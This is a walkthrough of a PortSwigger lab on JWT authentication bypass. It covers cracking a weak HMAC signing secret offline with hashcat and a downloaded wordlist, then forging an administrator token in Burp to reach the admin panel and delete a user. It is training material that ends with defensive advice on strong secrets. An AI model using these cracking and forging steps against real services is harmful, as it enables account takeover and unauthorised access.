# JWT Authentication Bypass via Weak Signing Key

**Platform:** PortSwigger Web Academy  
**Category:** JWT Attacks  
**Difficulty:** Practitioner  
**Lab URL:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key  

---

## Objective

Crack the weak HMAC secret used to sign JWTs, forge a token as `administrator`, access `/admin`, and delete user `carlos`.

---

## Background

When a server uses **HS256** (HMAC-SHA256) to sign JWTs, the security of every token depends entirely on the strength of the secret key. The server signs the token like this:

```
signature = HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)
```

If the secret is something short or common — like `secret`, `password`, or `1234` — an attacker can brute-force it offline using a wordlist. Once the secret is known, they can sign any payload they want and produce a valid signature the server will accept.

This is different from the `alg:none` or unverified signature labs — here the server **is** verifying the signature correctly. The flaw is the weak key choice, not the implementation.

---

## Tools Used

- Burp Suite (Proxy + Repeater)
- JWT Editor extension (for re-signing the forged token)
- `hashcat` — GPU-accelerated password cracker
- PortSwigger JWT secrets wordlist

---

## Steps

### 1. Log in and extract the JWT

Log in with:
- Username: `wiener`
- Password: `peter`

Grab the session JWT from the cookie. It looks like:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcyMDAwMDAwMH0.<signature>
```

Copy the **entire token** — you need all three parts for hashcat.

---

### 2. Crack the secret with hashcat

Hashcat supports JWT cracking natively with mode `-m 16500`.

Download the PortSwigger JWT secrets wordlist:

```bash
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
```

Run hashcat:

```bash
hashcat -a 0 -m 16500 <your_jwt_token> jwt.secrets.list
```

- `-a 0` — dictionary attack mode
- `-m 16500` — JWT HS256/HS384/HS512 mode
- The full JWT token is the hash input
- `jwt.secrets.list` is the wordlist

Hashcat output when cracked:

```
<jwt_token>:secret1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
```

The secret is shown after the colon — in this lab it's typically something like `secret1`.

---

### 3. Forge a new JWT signed with the cracked secret

In Burp JWT Editor:

1. Go to **JWT Editor Keys** → **New Symmetric Key**
2. Click **Generate** to create a blank key
3. Replace the `k` value with the Base64-encoded version of your cracked secret

To get the Base64 of `secret1`:

```bash
echo -n "secret1" | base64
```

Output: `c2VjcmV0MQ==`

Paste that as the `k` value in the key. Save it.

---

### 4. Modify the payload and re-sign

In Repeater, open the JWT tab. Change `sub` to `administrator`:

```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1720000000
}
```

Then click **Sign** → select your symmetric key → **OK**.

Burp re-signs the token using the cracked secret. The signature is now cryptographically valid — the server will accept it.

---

### 5. Access `/admin` and delete carlos

Send:

```
GET /admin HTTP/1.1
Cookie: session=<forged_token>
```

`200 OK` — admin panel accessible. Then:

```
GET /admin/delete?username=carlos
```

Lab solved.

---

## Why This Works

The server's JWT implementation is technically correct — it verifies the HMAC signature properly. The vulnerability is purely a **weak secret key**. An offline brute-force attack against HMAC-SHA256 is fast because:

- No network requests needed — hashcat works entirely offline against the token
- GPU acceleration makes billions of guesses per second feasible
- Common secrets wordlists are small enough to exhaust in seconds

Once the secret is recovered, the attacker has everything needed to produce unlimited valid tokens for any payload.

---

## How This Differs from the Other JWT Labs

| Lab | Verification Done? | Attack Type |
|---|---|---|
| Unverified Signature | ❌ None | Modify payload, keep old signature |
| alg:none | ❌ Skipped via header | Remove signature, change algorithm |
| **Weak Signing Key** | ✅ Yes — but weak secret | Crack secret offline, re-sign payload |
| JWK Injection | ✅ Yes — against attacker key | Inject own public key, self-sign |

This lab is the one where the server does everything right at the code level — the only mistake is operational: choosing a weak secret.

---

## Key Takeaway

> **A JWT is only as strong as its signing secret.** HMAC-based JWTs must use a cryptographically random secret of at least 256 bits (32 bytes). Short, guessable, or dictionary-word secrets can be cracked offline in seconds using hashcat — no interaction with the server required, and no logs generated.
